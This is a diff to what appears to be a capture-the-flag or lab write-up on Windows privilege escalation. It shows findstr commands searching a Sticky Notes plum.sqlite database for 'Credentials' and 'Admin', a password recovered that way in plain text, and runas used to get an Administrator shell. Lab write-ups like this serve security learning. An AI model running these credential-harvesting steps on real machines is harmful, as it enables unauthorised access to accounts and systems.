@@ -350,5 +350,23 @@ SeTimeZonePrivilege Change the time zone Enabled
 
 ![](image_12.png)
 
-Get-Content plum.sqlite | Select-String "Credentials"
-type plum.sqlite | findstr /i "Credentials"
+> type plum.sqlite | findstr /i "Credentials"
+
+![](image.png)
+
+> PS C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> type plum
+> .sqlite | findstr /i "Admin"
+
+![](image_15.png)
+
+MySupersecurePassword2112
+
+# success switch Administrator
+
+> runas /user:Administrator cmd
+
+![](image_16.png)
+
+C:\Users\Administrator
+
+![](image_18.png)
